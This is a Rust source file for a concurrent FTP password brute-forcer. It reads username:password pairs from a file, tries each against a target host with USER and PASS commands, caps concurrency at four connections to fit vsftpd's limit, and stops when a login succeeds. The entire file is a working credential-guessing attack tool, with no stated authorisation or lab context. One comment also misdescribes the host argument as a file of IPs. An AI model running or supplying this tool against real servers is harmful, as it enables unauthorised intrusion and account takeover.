mod constants;

use clap::Parser;
use constants::{LOGGED_IN, MAX_MESSAGE_SIZE, USRNAME_OK};
use futures::future;
use std::time::Instant;
use std::{sync::Arc, vec::Vec};
use tokio::sync::Semaphore;
use tokio::{
    fs::File,
    io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader, Result},
    net::TcpStream,
    select,
    sync::Mutex,
    task,
};

use tokio_util::sync::CancellationToken;

use crate::constants::RDY_FOR_NEW_USERS;

#[derive(Parser, Debug)]
struct Args {
    // path to .txt file containing list of IPs
    #[clap(short, long)]
    host: String,
    // path to .txt file containing list of passwords
    #[clap(short, long)]
    credentials: String,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    let host = args.host;
    let mut cred_file = BufReader::new(File::open(&args.credentials).await?);
    let attempts = Arc::new(Mutex::new(0));
    let token = CancellationToken::new();
    // This semaphore is used to restrict the max number of concurrent connections
    // vsftpd max conn = 4
    let sem = Arc::new(Semaphore::new(4));
    let mut tasks = Vec::new();
    println!("Starting...");
    let now = Instant::now();
    while let Some(cred) = get_credential(&mut cred_file).await {
        let host = host.clone();
        let token = token.clone();
        let permit = sem.clone().acquire_owned().await;
        let attempts = attempts.clone();
        tasks.push(task::spawn(async move {
            let _permit = permit;
            select! {
                _ = token.cancelled() => {}
                _ = async {
                    if let Ok(res) = attempt(&cred, &host).await {
                        if res ==  1 {
                            println!("------------- SUCCESS -------------");
                            print!("{}", cred);
                            println!("------------- SUCCESS -------------");
                            token.cancel();
                        }
                    let mut attempts = attempts.lock().await;
                    *attempts += 1;
                    }
                }
                 => {}
            }
        }))
    }
    future::join_all(tasks).await;
    println!("Total attempts {}", attempts.lock().await);
    println!("Total time elapsed: {}", now.elapsed().as_secs());
    Ok(())
}
async fn attempt(credential: &str, host: &str) -> Result<u8> {
    if let [username, password] = &credential.split(':').take(2).collect::<Vec<&str>>()[..] {
        let mut buffer = [0; MAX_MESSAGE_SIZE];
        let mut stream = TcpStream::connect(&host).await?;
        stream.read(&mut buffer).await?;
        if buffer[..3] == RDY_FOR_NEW_USERS {
            println!("attempting: {} {}", username, password);
            stream
                .write_all(format!("USER {}\r\n", username).as_bytes())
                .await?;
            stream.read(&mut buffer).await?;
            if buffer[..3] == USRNAME_OK {
                stream
                    .write_all(format!("PASS {}\r\n", password).as_bytes())
                    .await?;
                stream.read(&mut buffer).await?;
                if buffer[..3] == LOGGED_IN {
                    return Ok(1);
                }
            }
        }
    }
    Ok(0)
}
async fn get_credential(reader: &mut BufReader<File>) -> Option<String> {
    let mut line = String::new();
    match reader.read_line(&mut line).await {
        Ok(res) => {
            if res == 0 {
                None
            } else {
                Some(line)
            }
        }
        Err(err) => {
            println!("Error reading line {}", err);
            None
        }
    }
}
